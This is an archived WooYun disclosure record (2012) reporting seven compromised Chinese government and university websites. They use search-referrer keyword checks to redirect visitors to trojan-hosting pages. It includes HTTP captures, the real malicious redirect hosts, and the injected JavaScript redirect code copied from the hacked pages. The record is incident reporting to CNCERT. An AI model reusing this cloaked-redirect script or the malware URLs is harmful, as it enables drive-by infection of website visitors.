{"id": 16939, "wybug_id": "wooyun-2012-011246", "wybug_title": "大量政府网站被入侵挂马", "wybug_corp": "大量政府网站", "wybug_author": "路人甲", "wybug_date": "2012-09-04 11:15", "wybug_open_date": "2012-10-19 11:16", "wybug_type": "成功的入侵事件", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-09-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-09-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-10-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-10-19：\t细节向公众公开  简要描述： 大量政府网站被挂马，利用搜索引擎点击进行跳转。 详细说明：  1，广东茂名市气象局官方网站被入侵挂马,地址:www.mmqx.gov.cn当带有特定关键字的REFER访问时，将被302跳转到一个挂马网页：http://www.hynu.edu.cn/site/baidu.html?www.mmqx.gov.cn(hynu.edu.cn 是衡阳师范学院的网站，也已经被入侵挂马）可能茂名气象局的网站服务器被入侵\n\n百度搜索\"456 mmqx.gov.cn“第一个结果即是，目前仍未修复抓包结果：GET / HTTP/1.1Accept: */*Referer: http://www.baidu.com/s?wd=456+mmqx.gov.cn&rsv_bp=0&rsv_spt=3&rsv_n=2&inputT=4672Accept-Language: zh-cnAccept-Encoding: gzip, deflateHost: www.mmqx.gov.cnConnection: Keep-AliveHTTP/1.1 302 Object movedDate: Fri, 24 Aug 2012 01:04:53 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETLocation: http://www.hynu.edu.cn/site/baidu.html?www.mmqx.gov.cnContent-Length: 175Content-Type: text/htmlCache-control: private<head><title>Object moved</title></head><body><h1>Object Moved</h1>This object may be found <a HREF=\"http://www.hynu.edu.cn/site/baidu.html?www.mmqx.gov.cn\">here</a>.</body>2，汉中市南郑县人民政府官网www.nanzheng.gov.cn被入侵挂马当通过百度或其他搜索引擎REFER访问并带有特别关键字时，被301跳转到http://dfffg.3322.org:7接着跳转到木马网站可能服务器被入侵挂马\n\n在百度搜索\"456 nanzheng\"，第一个结果，点击即可发现，目前仍被挂马中抓包结果：GET / HTTP/1.1Accept: */*Referer: http://www.baidu.com/s?wd=456+nanzheng&rsv_bp=0&rsv_spt=3&inputT=2922Accept-Language: zh-cnAccept-Encoding: gzip, deflateHost: www.nanzheng.gov.cnConnection: Keep-AliveHTTP/1.1 301 Moved PermanentlyDate: Thu, 23 Aug 2012 11:22:06 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETLocation: http://dfffg.3322.org:7Content-Length: 0Content-Type: text/html3，巴彦淖尔政府网站文联分站被入侵，地址为：http://wl.bynr.gov.cn网站首页的代码判断REFER，如果来自指定关键字，则跳转到：ttp://a.fjtj.org:82/456s.asp可能网页被篡改或服务器被入侵\n\n如图，搜索\"wl.bynr 456\" ,第一个结果即是抓包结果：GET / HTTP/1.1Accept: */*Referer: http://www.baidu.com/s?wd=wl.bynr+456&rsv_bp=0&rsv_spt=3&rsv_n=2&inputT=3531Accept-Language: zh-cnAccept-Encoding: gzip, deflateHost: wl.bynr.gov.cnConnection: Keep-AliveHTTP/1.1 200 OKDate: Thu, 23 Aug 2012 11:34:47 GMTServer: Microsoft-IIS/6.0Content-Length: 13855Content-Type: text/htmlCache-control: private.....<script type=\"text/javascript\"><!--        var arrx=[\"http://a.fjtj.org:82/456s.asp\"];\tvar key=\"456\";\tvar refurl=document.referrer;\tvar iskey=false;\tif(decode_gb2312(refurl).indexOf(key)>-1)\t{\t\tsetTimeout(\"location.href=\"+\"\\\"\"+arrx[parseInt(Math.random()*arrx.length)]+\"\\\"\",0);\t} \tvar xx=new GB2312UTF8();.......4，鄂尔多斯市公安局交通管理支队官方网站被入侵,地址:www.ordosgajj.gov.cn通过特定的REFER关键字访问的请求将被导引到一个被篡改的页面页面上有木马程序可能服务器被入侵或网页被篡改\n\n如图，百度搜索\"456 ordosgajj.gov.cn\"，第一个结果点击即是，目前仍是如此抓包结果：GET / HTTP/1.1Accept: */*Referer: http://www.baidu.com/s?wd=456+ordosgajj.gov.cn&rsv_bp=0&rsv_spt=3&rsv_n=2&inputT=3656Accept-Language: zh-cnAccept-Encoding: gzip, deflateHost: www.ordosgajj.gov.cnConnection: Keep-AliveHTTP/1.1 200 OKContent-Length: 29938Content-Type: text/htmlContent-Location: http://www.ordosgajj.gov.cn/index.htmLast-Modified: Fri, 10 Aug 2012 06:41:25 GMTAccept-Ranges: bytesServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETDate: Thu, 23 Aug 2012 11:40:52 GMT.....<script type=\"text/javascript\">\tvar key=\"456\";\tvar refurl=document.referrer;\tvar iskey=false;\tif(decode_gb2312(refurl).indexOf(key)>-1)\t{\t\tiskey=true;\t} \tvar xx=new GB2312UTF8();\tif(xx.Utf8ToGb2312(refurl).indexOf(key)>-1)\t{\t\tiskey=true;\t}\tif(iskey!=true)\t{\t\tvar strUrl=window.location.href;\t\tvar arrUrl=strUrl.split(\"/\");\t\tvar strPage=arrUrl[arrUrl.length-1];\t\tif(strPage==\"default.html\")\t\t{                       }\t\telse\t\t{                          window.location=\"/index.aspx\";\t\t}\t}......5，迪庆藏族自治州人民政府官方网站:www.diqing.gov.cn 被入侵挂马通过特定关键字REFER访问网站，将被302跳转到http://tv456-002.6600.org:92/接着跳转到挂马网站 可能服务器被入侵\n\n百度搜索“diqing.gov.cn 456“ ，第一个结果即是，目前仍未修复抓包结果：GET / HTTP/1.1Accept: */*Referer: http://www.baidu.com/s?wd=diqing.gov.cn+456&rsv_bp=0&rsv_spt=3&inputT=2359Accept-Language: zh-cnAccept-Encoding: gzip, deflateHost: www.diqing.gov.cnConnection: Keep-AliveHTTP/1.1 302 FoundDate: Thu, 23 Aug 2012 11:46:41 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETX-AspNet-Version: 2.0.50727Location: http://tv456-002.6600.org:92/Cache-Control: privateContent-Type: text/html; charset=gb2312Content-Length: 146<html><head><title>Object moved</title></head><body><h2>Object moved to <a href=\"http://tv456-002.6600.org:92/\">here</a>.</h2></body></html>6，南京工业大学分站 gra.njut.edu.cn 被入侵挂马通过特定关键字REFER访问的请求，将被301跳转引导到一个挂马网页：http://www.shzq.edu.cn/extensions/ExtBank/360/index.htm（shzq.edu.cn是上海中侨职业技术学院的网站，此网站也被入侵挂马）可能南京工业大学分站服务器被入侵\n\n百度搜索“gra.njut.edu.cn 456”，第一个结果即是抓包结果：GET / HTTP/1.1Accept: */*Referer: http://www.baidu.com/s?wd=gra.njut.edu.cn+456&rsv_bp=0&rsv_spt=3&rsv_n=2&inputT=375Accept-Language: zh-cnAccept-Encoding: gzip, deflateHost: gra.njut.edu.cnConnection: Keep-AliveHTTP/1.1 301 Moved PermanentlyDate: Thu, 23 Aug 2012 11:54:47 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETLocation: http://www.shzq.edu.cn/extensions/ExtBank/360/index.htmContent-Length: 0Content-Type: text/htmlCache-control: private7，中国广西东兴市人民政府网站被入侵,地址:http://www.dxzf.gov.cn当通过特定的关键字REFER访问此网站时，将被导引到一个木马网站：www.ff456.info可能服务器被入侵或网页被篡改\n\n百度搜索“456 dxzf.gov.cn” ，第一个结果即是，目前仍未修复抓包结果：GET / HTTP/1.1Accept: */*Referer: http://www.baidu.com/s?wd=456+dxzf.gov.cn&rsv_bp=0&rsv_spt=3&rsv_n=2&inputT=1703Accept-Language: zh-cnAccept-Encoding: gzip, deflateHost: www.dxzf.gov.cnConnection: Keep-AliveHTTP/1.1 200 OKContent-Length: 13995Content-Type: text/htmlContent-Location: http://www.dxzf.gov.cn/index.htmLast-Modified: Wed, 22 Aug 2012 04:26:50 GMTAccept-Ranges: bytesServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETDate: Thu, 23 Aug 2012 11:59:57 GMT....<script type=\"text/javascript\"><!--        var arrx=[\"http://www.ff456.info\"];\tvar key=\"456\";\tvar refurl=document.referrer;\tvar iskey=false;\tif(decode_gb2312(refurl).indexOf(key)>-1)\t{\t\tsetTimeout(\"location.href=\"+\"\\\"\"+arrx[parseInt(Math.random()*arrx.length)]+\"\\\"\",0);\t} \tvar xx=new GB2312UTF8();\tif(xx.Utf8ToGb2312(refurl).indexOf(key)>-1)\t{\t\tsetTimeout(\"location.href=\"+\"\\\"\"+arrx[parseInt(Math.random()*arrx.length)]+\"\\\"\",0);\t}\tif(iskey!=true)\t{\t\tvar strUrl=window.location.href;\t\tvar arrUrl=strUrl.split(\"/\");\t\tvar strPage=arrUrl[arrUrl.length-1];\t\tif(strPage==\"index.htm\")\t\t{\t\t\twindow.location=\"index.asp\";\t\t}\t\telse\t\t{\t\t\twindow.location=\"index.asp\";\t\t}\t} --></script>   漏洞证明：  如上   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2012-09-07 22:49 厂商回复： CNVD确认所述Refer引用搜索引擎结果查询网站挂马、篡改的情况，对于提交的情况暂未按漏洞信息认定，仅属于监测发现安全事件。同理，CNCERT自主监测系统亦对搜索引擎结果有所整理，感谢提交者提供的信息。rank 7 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}